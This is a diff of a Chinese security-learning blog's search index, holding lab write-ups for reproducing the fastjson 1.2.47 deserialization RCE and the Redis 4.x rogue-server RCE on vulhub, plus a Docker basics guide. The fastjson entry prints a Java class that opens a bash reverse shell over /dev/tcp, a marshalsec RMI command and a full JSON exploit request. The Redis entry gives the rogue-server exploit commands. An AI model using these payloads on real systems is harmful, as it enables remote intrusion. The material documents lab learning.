-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></p>
-<p><a href="https://blog.csdn.net/qq_40989258/article/details/103049474">https://blog.csdn.net/qq_40989258/article/details/103049474</a></p>
-<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
-<p><a href="https://www.cnblogs.com/Welk1n/p/11446519.html">fastjson漏洞分析利用</a></p>
-]]></content>
       <tags>
         <tag>fastjson</tag>
       </tags>
@@ -579,65 +485,115 @@
       </tags>
   </entry>
   <entry>
-    <title>redis 4-unacc</title>
-    <url>/2021/06/28/redis-4-unacc/</url>
-    <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击者：192.168.229.129</p>
-<p>靶机：192.168.229.137</p>
-<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
-<p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
-<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击者也要安装Redis</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
-<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
-<p><img src="https://i.loli.net/2021/06/28/eJ7SLuprHd4xIWw.png" alt="image-20210628142638144"></p>
-<h2 id="Redis直接连接"><a href="#Redis直接连接" class="headerlink" title="Redis直接连接"></a>Redis直接连接</h2><p>可以使用kali中的Redis直接连接<code>./redis-cli -h ip</code></p>
-<p>使用<code>info</code>可以查看到一些服务器的敏感信息</p>
-<p><img src="https://i.loli.net/2021/06/28/92slmStOpfTcWnA.png" alt="image-20210628142952657"></p>
-<h2 id="下载exp到本地"><a href="#下载exp到本地" class="headerlink" title="下载exp到本地"></a>下载exp到本地</h2><p><img src="https://i.loli.net/2021/06/28/unGywmoYF3XRehd.png" alt="image-20210628143941751"></p>
-<h2 id="make编译exp"><a href="#make编译exp" class="headerlink" title="make编译exp"></a>make编译exp</h2><p>cd到<code>redis-rogue-server /RedisModulesSDK/exp/</code>目录下，使用make进行编译，该目录下会多出<code>exp.o</code>和<code>exp.so</code>两个文件</p>
-<p><img src="https://i.loli.net/2021/06/28/wOQgcMWfEeASXGb.png" alt="image-20210628144722979"></p>
-<p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
-<p>返回到<code>redis-rogue-server.py</code>目录下</p>
-<p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
-<p><img src="https://i.loli.net/2021/07/24/Kyfbumq3zYErXdx.png" alt="image-20210724191619236"></p>
-<p>然后就卡住了。。</p>
-<p>换了个exp</p>
-<p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
-<p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
-<p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
-<p><img src="https://i.loli.net/2021/07/24/lNbpzYX9uBOGr8x.png" alt="image-20210724191339232"></p>
-<p>然后就又卡住了。。。</p>
-<h2 id="在新的靶机上搭建docker"><a href="#在新的靶机上搭建docker" class="headerlink" title="在新的靶机上搭建docker"></a>在新的靶机上搭建docker</h2><p>vps不好用，搭了个本地的环境来演示</p>
-<p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
-<p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
-<p>最后也是糊里糊涂添加了一堆源</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
-<p>然后就可以了。。。淦</p>
-<p>直连成功</p>
-<p><img src="https://i.loli.net/2021/06/28/jGkwFEeo6zlWJVa.png" alt="image-20210628204907522"></p>
-<p><code>./redis-master.py -r 192.168.229.137 -p 6379 -L 192.168.229.129 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
-<p><img src="https://i.loli.net/2021/06/28/xaeSJCN8zQfIvbE.png" alt="image-20210628205215675"></p>
-<p>不过是<code>eredis</code>是什么鬼？？？</p>
-<p>第一个exp也可以利用</p>
-<p><img src="https://i.loli.net/2021/06/28/kE2gR3pcPFxudeh.png" alt="image-20210628210157607"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己啥都没做，差太多了，还有</p>
+    <title>fastjson 1.2.47-rce</title>
+    <url>/2021/09/20/fastjson-1-2-47-rce/</url>
+    <content><![CDATA[<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47-rce"></a>fastjson 1.2.47-rce</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>1.2.47 这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制</p>
 <blockquote>
-<p>这里只是使用vulhub漏洞环境，只能通过该exp来getshell，像通过写文件、ssh key或定时计划来getshell,都是不成功的，会提示没有权限</p>
+<p>具体分析见<a href="https://www.freebuf.com/vuls/208339.html">浅谈Fastjson RCE漏洞的绕过史</a></p>
 </blockquote>
-<p>考完就尝试另外三个方法</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yiiiing/article/details/108218674">Redis 4.x5.x 未授权访问漏洞EXP复现过程</a></p>
-<p><a href="https://blog.csdn.net/roukmanx/article/details/103682318">Redis 4.x/5.x 未授权访问漏洞</a></p>
-<p><a href="https://www.cnblogs.com/rnss/p/13612703.html">redis 4-unacc 复现</a></p>
+<p><img src="https://i.loli.net/2021/09/22/nuHJF8jqwGcCmXz.png" alt="img"></p>
+<h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机：jdk1.8.0_301、Apache Maven 3.3.9、fastjson1.2.47</p>
+<p>攻击机：jdk1.8.0_301、Apache Maven 3.3.9、marshalsec</p>
+<p><img src="https://i.loli.net/2021/09/22/mJi7VDOIvstxu4k.png" alt="image-20210922211752091"></p>
+<p>注意jdk版本会影响该漏洞复现</p>
+<ul>
+<li>两种不同协议实现反弹shell有jdk版本要求,<strong>而且最后接收shell的vps的JDK版本要和靶机的版本相近</strong></li>
+</ul>
+<blockquote>
+<p>下图jdk版本不存在该漏洞</p>
+<p><img src="https://i.loli.net/2021/09/22/Nw3SFaVJGCIRXg8.png" alt="img"></p>
+</blockquote>
+<p>访问8090端口</p>
+<p><img src="https://i.loli.net/2021/09/22/Z1IapGmlACtJzw2.png" alt="image-20210922200207047"></p>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>同fastjson1.2.24复现步骤</p>
+<h4 id="1-编译生成恶意类-class"><a href="#1-编译生成恶意类-class" class="headerlink" title="1.编译生成恶意类.class"></a>1.编译生成恶意类.class</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;接收shell的ip&#x2F;8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e &#x3D; new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="2-python开启一个临时web服务SimpleHTTPServer"><a href="#2-python开启一个临时web服务SimpleHTTPServer" class="headerlink" title="2.python开启一个临时web服务SimpleHTTPServer"></a>2.python开启一个临时web服务<code>SimpleHTTPServer</code></h4><p><code>python -m  SimpleHTTPServer 4444</code></p>
+<blockquote>
+<p><strong>为了接收LDAP服务重定向请求</strong>，并需要在payload目录下开启，这样才能访问到payload文件</p>
+</blockquote>
+<h4 id="3-marshalsec开启LDAP或是RMI监听"><a href="#3-marshalsec开启LDAP或是RMI监听" class="headerlink" title="3.marshalsec开启LDAP或是RMI监听"></a>3.marshalsec开启LDAP或是RMI监听</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.j marshalsec.jndi.RMIRefServer &quot;http://攻击者ip:4444/#Exploit&quot; 9999</code></p>
+<blockquote>
+<p>借助LDAP服务将LDAP reference result 重定向到web服务器</p>
+<p>LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管</p>
+</blockquote>
+<h4 id="4-burp发送poc"><a href="#4-burp发送poc" class="headerlink" title="4.burp发送poc"></a>4.burp发送poc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko&#x2F;20100101 Firefox&#x2F;18.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;攻击者ip:9999&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/09/23/YgxWpiS7dbhQnoH.png" alt="image-20210923113053182"></p>
+<p>注：所有的工具和编译文件要放在同一目录下，并且python开启http服务也在当前目录</p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>靶机</p>
+<p>环境</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/null1433/p/12697682.html">https://www.cnblogs.com/null1433/p/12697682.html</a></p>
+<p><a href="https://blog.csdn.net/qq_40989258/article/details/103049474">https://blog.csdn.net/qq_40989258/article/details/103049474</a></p>
+<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
+<p><a href="https://www.cnblogs.com/Welk1n/p/11446519.html">fastjson漏洞分析利用</a></p>
+]]></content>
+      <tags>
+        <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker基本使用</title>
+    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
+<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/Kc418tknQyboP2B.png" alt="image-20210417215354480"></p>
+<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参数解释：</p>
+<p>-d 镜像在后台运行</p>
+<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
+<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
+</blockquote>
+<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
+<p><img src="https://i.loli.net/2021/07/18/3SrifKmUEc4gDjH.png" alt="image-20210417222849702"></p>
+<blockquote>
+<p>请注意这张图片中的容器端口8801是错误的</p>
+</blockquote>
+<p>但是会报错，是因为没有开启ipv4转发</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
+</blockquote>
+<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
+<p><img src="https://i.loli.net/2021/07/18/SzxIcodBJ8OKXlP.png" alt="image-20210417222634372"></p>
+<p>重启服务并查看修改是否成功</p>
+<p><img src="https://i.loli.net/2021/07/18/eEBdl8F42iau5h7.png" alt="image-20210417222728689"></p>
+<blockquote>
+<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/18/bw2fHrsI69uhdyN.png" alt="image-20210418160119935"></p>
+<blockquote>
+<p>成功访问</p>
+</blockquote>
+<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/iObYJydP1umQ5ea.png" alt="image-20210417223707346"></p>
+<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/fqElpH7iRYBAKDQ.png" alt="image-20210417223949376"></p>
+<p><img src="https://i.loli.net/2021/07/18/aNjniAr1lCGOJe5.png" alt="image-20210418160159989"></p>
+<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
+<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
+<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删除容器和镜像时需要注意的是：</p>
+<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
+</blockquote>
+<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
 ]]></content>
       <categories>
-        <category>vulhub</category>
+        <category>docker</category>
       </categories>
       <tags>
-        <tag>redis</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -747,20 +703,97 @@
       </tags>
   </entry>
   <entry>
-    <title>redis rce 4.x/5.x 基于主从复制</title>
-    <url>/2021/07/24/redis-rce-4-x-5-x-%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="基于主从复制的rce"><a href="#基于主从复制的rce" class="headerlink" title="基于主从复制的rce"></a>基于主从复制的rce</h1><h2 id="什么是主从复制"><a href="#什么是主从复制" class="headerlink" title="什么是主从复制"></a>什么是主从复制</h2><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而<strong>从机只负责读，主机只负责写</strong>，通过<strong>读写分离</strong>可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式</p>
+    <title>redis 4-unacc</title>
+    <url>/2021/06/28/redis-4-unacc/</url>
+    <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击者：192.168.229.129</p>
+<p>靶机：192.168.229.137</p>
+<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
+<p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
+<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击者也要安装Redis</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
+<p><img src="https://i.loli.net/2021/06/28/eJ7SLuprHd4xIWw.png" alt="image-20210628142638144"></p>
+<h2 id="Redis直接连接"><a href="#Redis直接连接" class="headerlink" title="Redis直接连接"></a>Redis直接连接</h2><p>可以使用kali中的Redis直接连接<code>./redis-cli -h ip</code></p>
+<p>使用<code>info</code>可以查看到一些服务器的敏感信息</p>
+<p><img src="https://i.loli.net/2021/06/28/92slmStOpfTcWnA.png" alt="image-20210628142952657"></p>
+<h2 id="下载exp到本地"><a href="#下载exp到本地" class="headerlink" title="下载exp到本地"></a>下载exp到本地</h2><p><img src="https://i.loli.net/2021/06/28/unGywmoYF3XRehd.png" alt="image-20210628143941751"></p>
+<h2 id="make编译exp"><a href="#make编译exp" class="headerlink" title="make编译exp"></a>make编译exp</h2><p>cd到<code>redis-rogue-server /RedisModulesSDK/exp/</code>目录下，使用make进行编译，该目录下会多出<code>exp.o</code>和<code>exp.so</code>两个文件</p>
+<p><img src="https://i.loli.net/2021/06/28/wOQgcMWfEeASXGb.png" alt="image-20210628144722979"></p>
+<p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
+<p>返回到<code>redis-rogue-server.py</code>目录下</p>
+<p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
+<p><img src="https://i.loli.net/2021/07/24/Kyfbumq3zYErXdx.png" alt="image-20210724191619236"></p>
+<p>然后就卡住了。。</p>
+<p>换了个exp</p>
+<p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
+<p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
+<p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p><img src="https://i.loli.net/2021/07/24/lNbpzYX9uBOGr8x.png" alt="image-20210724191339232"></p>
+<p>然后就又卡住了。。。</p>
+<h2 id="在新的靶机上搭建docker"><a href="#在新的靶机上搭建docker" class="headerlink" title="在新的靶机上搭建docker"></a>在新的靶机上搭建docker</h2><p>vps不好用，搭了个本地的环境来演示</p>
+<p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
+<p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
+<p>最后也是糊里糊涂添加了一堆源</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
+<p>然后就可以了。。。淦</p>
+<p>直连成功</p>
+<p><img src="https://i.loli.net/2021/06/28/jGkwFEeo6zlWJVa.png" alt="image-20210628204907522"></p>
+<p><code>./redis-master.py -r 192.168.229.137 -p 6379 -L 192.168.229.129 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p><img src="https://i.loli.net/2021/06/28/xaeSJCN8zQfIvbE.png" alt="image-20210628205215675"></p>
+<p>不过是<code>eredis</code>是什么鬼？？？</p>
+<p>第一个exp也可以利用</p>
+<p><img src="https://i.loli.net/2021/06/28/kE2gR3pcPFxudeh.png" alt="image-20210628210157607"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己啥都没做，差太多了，还有</p>
 <blockquote>
-<p>当数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式</p>
+<p>这里只是使用vulhub漏洞环境，只能通过该exp来getshell，像通过写文件、ssh key或定时计划来getshell,都是不成功的，会提示没有权限</p>
 </blockquote>
-<h2 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h2><p>Redis在4.x以后新增了模块功能，通过外部扩展，可以实现在Redis中实现一个新的Redis命令，通过c并编译出<code>.so</code>文件</p>
-<h2 id="利用范围"><a href="#利用范围" class="headerlink" title="利用范围"></a>利用范围</h2><p>Redis 4.x-Redis 5.x</p>
-<p><img src="https://i.loli.net/2021/07/26/kdjrNSR6bivB1fQ.png" alt="image-20210726101726937"></p>
-<p><img src="https://i.loli.net/2021/07/25/DItCREc985YXj7J.png" alt="image-20210725211335807"></p>
-<p><img src="https://i.loli.net/2021/07/25/pJVHLjYRSyM3h9T.png" alt="image-20210725222651716"></p>
+<p>考完就尝试另外三个方法</p>
